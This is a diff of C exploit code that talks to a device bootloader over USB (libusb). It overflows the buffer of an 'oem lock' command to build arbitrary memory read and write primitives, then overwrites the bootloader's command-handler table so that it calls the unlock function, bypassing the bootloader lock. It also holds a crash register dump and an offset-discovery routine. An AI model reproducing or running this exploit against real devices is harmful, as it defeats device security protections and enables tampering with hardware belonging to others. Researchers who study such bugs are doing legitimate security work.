@@ -163,14 +163,18 @@ void init_primitive(libusb_device_handle *h)
     memset(buf, 0x0, bufSize);
 
     {
-        *(uint64_t *)(buf + 0x3F9008) = 0xFFFFD008; // real address of itself (X0)
+        uint32_t off = (RPMBListenerParams_Offset + RPMBProtocol_Offset);
 
-        *(uint64_t *)(buf + 0x3F9008 + 8) = (ufsDxeAddr + ufsDxe_RPMBListenerParams_Offset); // (lower part)
+        *(uint64_t *)(buf + off) = (usbBufAddr + off); // real address of itself (X0)
 
+        *(uint64_t *)(buf + off + 8) = (ufsDxeAddr + ufsDxe_RPMBListenerParams_Offset); // (lower part)
+
+        // 0xFFFDA000 = usbBufAddr + RPMBListenerParams_Offset
         // 0xFFFDA000 -> 0xFFC5A000
-        *(uint32_t *)(buf + 0x3F9008 + 16) = 0x380000;
+        // so that it can be part of usb buffer, no more cache problems
+        *(uint32_t *)(buf + off + 16) = 0x380000;
 
-        *(uint64_t *)(buf + 0x3F9008 + 32) = (clockDxeAddr + clockDxe_BitclearPrimitive_Offset);
+        *(uint64_t *)(buf + off + 32) = (clockDxeAddr + clockDxe_BitclearPrimitive_Offset);
     }
 
     sprintf(buf, "oem lock");
@@ -329,6 +333,59 @@ void write_primitive_8(libusb_device_handle *h, uint64_t addr, uint64_t value)
     write_primitive_4(h, (addr + 4), (uint32_t)(value >> 32));
 }
 
+#if 0
+
+data fault: @ 5A7445BD PC at 0x1FF5F9DE8, FAR 0xFFFFFFFFFF3F9028, iss 0x4
+
+recovery attempted for : 1000 us
+ESR 0x96000004: ec 0x25, il 0x2000000, iss 0x4
+iframe 0x9ba19060:
+X0   FFFFFFFFFF3F9008    X16         1FD775980
+X1                  1    X17         1FD7752C0
+X2                  0    X18                 0
+X3           FFFDA014    X19          FFFDA000
+X4                  2    X20         1FD775098
+X5           FFFFFFFF    X21         1FD775098
+X6                 14    X22              2000
+X7                  0    X23              EE02
+X8              23008    X24                28
+X9                  0    X25          FFFFFFFF
+X10                18    X26         1FFE321A8
+X11         1FF606000    X27                 5
+X12          FFFDA000    X28          32000101
+X13         1FD7750A4    X29          9BA19190
+X14                 0    X30         1FF5F9D4C
+X15                 0    PC          1FF5F9DE8
+SP          9BA19170
+SPSR        60000005
+
+// RPMBListenerParams_Offset = (0x3F9008 - RPMBProtocol_Offset)
+
+#endif
+
+void get_RPMBListenerParams_RPMBProtocol_Offset(libusb_device_handle *h)
+{
+    static const size_t resBufMaxSize = 512;
+    char resBuf[resBufMaxSize] = {0};
+
+    static const size_t allocatedBufSize = 0x1000000;
+    static const size_t bufSize = 0xff0001;
+    uint8_t *buf = (uint8_t *)malloc(allocatedBufSize);
+
+    memset(buf, 0x0, bufSize);
+
+   for (uint64_t offset = 0; offset < bufSize; offset += 8)
+        *(uint64_t *)(buf + offset) = 0xffffffffff000000ull | (offset);
+
+    sprintf(buf, "oem lock");
+    write_to_adu(h, buf, bufSize);
+    usleep(10 * 1000);
+    read_chunk(h, resBuf, resBufMaxSize);
+    printf("resBuf = %s\n", resBuf);
+
+    free(buf);
+}
+
 int main(int argc, char **argv)
 {
     if (libusb_init(NULL) < 0)
@@ -356,6 +413,11 @@ int main(int argc, char **argv)
         printf("resBuf = %s\n", resBuf);
     }
 
+#if 0
+    get_RPMBListenerParams_RPMBProtocol_Offset(h);
+    abort();
+#endif
+
     init_primitive(h);
 
 #if 0
@@ -376,7 +438,7 @@ int main(int argc, char **argv)
         //static const uint64_t sdccDxe_RPMBListenerParams_Offset = 0x19440;
         //read_primitive_8(h, (sdccDxeBase + sdccDxe_RPMBListenerParams_Offset));
 
-        // RPMBProtocol = 0x1FF604D70
+        // OriginalRPMBProtocol = 0x1FF604D70
         read_primitive_8(h, (0xFFADB000 + RPMBProtocol_Offset));
     }
 
@@ -400,10 +462,7 @@ int main(int argc, char **argv)
 
 #endif
 
-        //static const uint64_t oemlockStr_offset = 0x97af8;
         static const uint64_t oemunlockStr_offset = 0x97aed;
-
-        //static const uint64_t lockFunc_offset = 0x5c23c; // original lock func
         static const uint64_t unlockFunc_offset = 0x3ecd0;
 
         for (uint64_t addr = 0xFD77D018; addr < 0xFD77F000; addr += 32)
@@ -414,9 +473,13 @@ int main(int argc, char **argv)
             write_primitive_8(h, addr + 24, (linuxLoaderBase + unlockFunc_offset));
         }
 
+        // set high part of cmdline pointer to 0
+        // 0x1FD77E398 -> 0xFD77E398
         write_primitive_4(h, (linuxLoaderBase + cmdline_offset + 4), 0x0);
 
-        restore(h); // if succeed, this should show "unknown command"
+        restore(h);
+
+        // if succeed, this should show "unknown command"
         // then we can use oem unlock to unlock the bootloader
         // it will hang, but after next boot it will be unlocked
     }
